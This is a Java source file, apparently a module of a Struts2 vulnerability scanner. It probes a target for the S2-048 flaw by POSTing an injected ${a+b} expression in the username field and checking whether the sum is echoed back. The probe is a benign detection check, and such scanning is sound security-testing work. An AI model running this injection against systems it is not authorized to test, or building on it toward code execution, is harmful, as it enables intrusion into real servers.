package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_048 implements Check {
    public String printInfo(){
        String info = "[+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        Map<String,String> data = new HashMap<String,String>();


        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "${" + number1 + "+" + number2 + "}";

        int number = number1 + number2;
        if (path==null){
            path = "/index.action";
        }else if(!path.endsWith(".action")){
            path = path+"index.action";
        }

        data.put("username",poc);
        data.put("password","123456789ZAA");

        String url = protocol + "://" + host + ":" + port + path;


        try {
            HttpResult result = HttpClient.post(url,data);

            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m = p.matcher(result.getData());

            if (m.find()) {
                return true;
            } else {
                return false;
            }

        }catch (Exception e){
            return false;
        }


    }

}
